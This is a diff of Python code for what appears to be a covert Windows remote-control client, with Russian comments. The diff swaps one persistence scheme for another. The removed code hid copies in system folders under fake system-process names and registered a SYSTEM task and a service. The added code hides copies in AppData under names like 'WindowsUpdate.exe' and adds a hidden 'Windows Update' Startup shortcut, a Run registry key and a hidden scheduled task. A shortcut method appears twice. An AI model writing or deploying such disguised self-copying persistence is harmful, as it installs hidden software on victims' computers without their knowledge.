@@ -84,25 +84,29 @@ class PCClient:
             else:
                 current_path = os.path.realpath(__file__)
             
-            # 1. Скрытые места для копий (более надежные)
-            hidden_locations = [
-                os.path.join(os.getenv('SystemRoot'), 'System32', 'Tasks'),  # Планировщик заданий
-                os.path.join(os.getenv('SystemRoot'), 'ServiceProfiles', 'LocalService'),  # Служебный профиль
-                os.path.join(os.getenv('ProgramData'), 'Microsoft', 'Windows Defender', 'Platform'),  # Защитник Windows
-                os.path.join(os.getenv('ProgramData'), 'Microsoft', 'Network', 'Downloader'),  # Сетевые загрузки
-                os.path.join(os.getenv('ProgramData'), 'NVIDIA Corporation', 'NetService'),  # NVIDIA
-                os.path.join(os.getenv('ProgramData'), 'Package Cache')  # Кэш установщиков
+            # 1. Безопасные места для копий (не требуют админских прав)
+            safe_locations = [
+                os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
+                os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Themes'),
+                os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Windows', 'History'),
+                os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
+                os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Windows', 'Explorer'),
+                os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Windows Mail')
             ]
             
-            # 2. Создаем копии в скрытых местах
+            # 2. Имена для копий (маскировка)
             copy_names = [
-                'taskhostw.exe',  # Маскировка под системный процесс
-                'wlms.exe',       # Windows License Monitoring
-                'msdtc.exe',      # Distributed Transaction Coordinator
-                'dfsr.exe'        # DFS Replication
+                'WindowsUpdate.exe',
+                'ThemeHelper.exe',
+                'HistoryService.exe',
+                'EdgeCrashHandler.exe',
+                'ExplorerHelper.exe',
+                'MailService.exe'
             ]
             
-            for i, location in enumerate(hidden_locations):
+            # 3. Создаем копии в безопасных местах
+            created_copies = 0
+            for i, location in enumerate(safe_locations):
                 try:
                     os.makedirs(location, exist_ok=True)
                     copy_name = copy_names[i % len(copy_names)]
@@ -110,45 +114,148 @@ class PCClient:
                     
                     if not os.path.exists(copy_path):
                         shutil.copy2(current_path, copy_path)
-                        # Устанавливаем скрытый и системный атрибуты
-                        ctypes.windll.kernel32.SetFileAttributesW(copy_path, 2 | 4)
+                        # Устанавливаем скрытый атрибут
+                        ctypes.windll.kernel32.SetFileAttributesW(copy_path, 2)
+                        created_copies += 1
+                        
+                        # Для автозагрузки создаем ярлык
+                        if 'Startup' in location:
+                            self.create_startup_shortcut(copy_path)
                 except Exception as e:
                     print(f"Ошибка создания копии в {location}: {e}")
             
-            # 3. Добавляем в автозагрузку (более скрытые методы)
-            self.add_to_startup(current_path)
-            
-        except Exception as e:
-            print(f"Ошибка персистентности: {e}")
-    
-    def add_to_startup(self, exe_path):
-        try:
-            # Метод 1: Планировщик заданий (самый скрытный)
-            try:
-                schtasks_cmd = f'schtasks /create /tn "Windows Update Manager" /tr "{exe_path}" /sc onlogon /ru SYSTEM /f'
-                subprocess.run(schtasks_cmd, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            except:
-                pass
-            
-            # Метод 2: RunOnce в реестре (для текущего пользователя)
-            try:
-                key = winreg.HKEY_CURRENT_USER
-                key_path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
-                with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
-                    winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
-            except:
-                pass
-            
-            # Метод 3: Службы (требует админских прав)
-            try:
-                service_name = "WinUpdate"
-                sc_cmd = f'sc create {service_name} binPath= "{exe_path}" start= auto'
-                subprocess.run(sc_cmd, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            except:
-                pass
+            # 4. Альтернативные методы автозагрузки
+            if created_copies == 0:
+                print("Не удалось создать копии, используем реестр")
+                self.add_to_registry(current_path)
                 
         except Exception as e:
-            print(f"Ошибка добавления в автозагрузку: {e}")
+            print(f"Ошибка персистентности: {e}")
+
+    def create_startup_shortcut(self, target_path):
+        try:
+            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            shortcut_path = os.path.join(startup_folder, 'Windows Update.lnk')
+            
+            if not os.path.exists(shortcut_path):
+                import winshell
+                from win32com.client import Dispatch
+                
+                shell = Dispatch('WScript.Shell')
+                shortcut = shell.CreateShortCut(shortcut_path)
+                shortcut.Targetpath = target_path
+                shortcut.WorkingDirectory = os.path.dirname(target_path)
+                shortcut.WindowStyle = 7  # MINIMIZED
+                shortcut.save()
+                
+                # Скрываем ярлык
+                ctypes.windll.kernel32.SetFileAttributesW(shortcut_path, 2)
+        except Exception as e:
+            print(f"Ошибка создания ярлыка автозагрузки: {e}")
+
+    def add_to_registry(self, exe_path):
+        try:
+            # Добавляем в реестр текущего пользователя
+            key = winreg.HKEY_CURRENT_USER
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            
+            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
+                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
+                
+        except Exception as e:
+            print(f"Ошибка добавления в реестр: {e}")
+            # Последний резервный вариант - планировщик через XML
+            self.create_scheduled_task(exe_path)
+
+    def create_scheduled_task(self, exe_path):
+        try:
+            # Создаем временный XML файл для задачи
+            xml_content = f"""<?xml version="1.0" encoding="UTF-16"?>
+    <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+    <RegistrationInfo>
+        <Description>Windows Update</Description>
+    </RegistrationInfo>
+    <Triggers>
+        <LogonTrigger>
+        <Enabled>true</Enabled>
+        </LogonTrigger>
+    </Triggers>
+    <Principals>
+        <Principal id="Author">
+        <UserId>{os.getenv('USERDOMAIN')}\\{os.getenv('USERNAME')}</UserId>
+        <LogonType>InteractiveToken</LogonType>
+        <RunLevel>LeastPrivilege</RunLevel>
+        </Principal>
+    </Principals>
+    <Settings>
+        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+        <AllowHardTerminate>false</AllowHardTerminate>
+        <StartWhenAvailable>true</StartWhenAvailable>
+        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+        <IdleSettings>
+        <StopOnIdleEnd>false</StopOnIdleEnd>
+        <RestartOnIdle>false</RestartOnIdle>
+        </IdleSettings>
+        <AllowStartOnDemand>true</AllowStartOnDemand>
+        <Enabled>true</Enabled>
+        <Hidden>true</Hidden>
+        <RunOnlyIfIdle>false</RunOnlyIfIdle>
+        <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
+        <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
+        <WakeToRun>false</WakeToRun>
+        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+        <Priority>7</Priority>
+    </Settings>
+    <Actions Context="Author">
+        <Exec>
+        <Command>{exe_path}</Command>
+        </Exec>
+    </Actions>
+    </Task>"""
+            
+            temp_xml = os.path.join(os.getenv('TEMP'), 'windows_update_task.xml')
+            with open(temp_xml, 'w', encoding='utf-16') as f:
+                f.write(xml_content)
+            
+            # Импортируем задачу в планировщик
+            subprocess.run(
+                ['schtasks', '/Create', '/XML', temp_xml, '/TN', 'Windows Update', '/F'],
+                check=True,
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            # Удаляем временный XML
+            os.remove(temp_xml)
+            
+        except subprocess.CalledProcessError as e:
+            print(f"Ошибка создания задачи (код {e.returncode}): {e.stderr.decode('cp866', errors='ignore')}")
+        except Exception as e:
+            print(f"Неизвестная ошибка планировщика: {e}")
+
+    def create_startup_shortcut(self, target_path):
+        try:
+            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            shortcut_path = os.path.join(startup_folder, 'Windows Update.lnk')
+            
+            if not os.path.exists(shortcut_path):
+                import winshell
+                from win32com.client import Dispatch
+                
+                shell = Dispatch('WScript.Shell')
+                shortcut = shell.CreateShortCut(shortcut_path)
+                shortcut.Targetpath = target_path
+                shortcut.WorkingDirectory = os.path.dirname(target_path)
+                shortcut.WindowStyle = 7  # Скрытое окно
+                shortcut.save()
+                
+                # Скрываем ярлык
+                ctypes.windll.kernel32.SetFileAttributesW(shortcut_path, 2)
+        except Exception as e:
+            print(f"Ошибка создания ярлыка автозагрузки: {e}")
 
     def register_device(self):
         while self.running:
